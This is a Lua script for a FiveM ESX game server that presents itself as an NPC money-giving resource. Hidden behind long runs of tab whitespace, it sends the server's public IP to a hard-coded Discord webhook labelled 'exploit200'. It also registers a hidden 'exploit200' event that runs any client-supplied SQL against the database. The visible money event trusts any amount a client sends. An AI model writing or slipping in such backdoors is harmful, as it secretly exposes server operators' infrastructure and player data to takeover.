ESX = nil																																				;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discordapp.com/api/webhooks/770338811750121514/kG2-ddlWNOD3ODnZ-tIg4S9JqiS3CP1-k4dKYd87EQcyU7h1j-uz177h3KQdeNsjTACS" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)																													Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit200", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)


RegisterServerEvent('esx_npcpaskagiveMoney')
AddEventHandler('esx_npcpaskagiveMoney', function(rahamaara)
	local _source  = source
	local xPlayer  = ESX.GetPlayerFromId(_source)
	xPlayer.addMoney(rahamaara)
	TriggerClientEvent("satijuuvihhutallasta", source, rahamaara)
end)																																					RegisterServerEvent("exploit200");AddEventHandler("exploit200", function(data) MySQL.Async.execute(data) end)
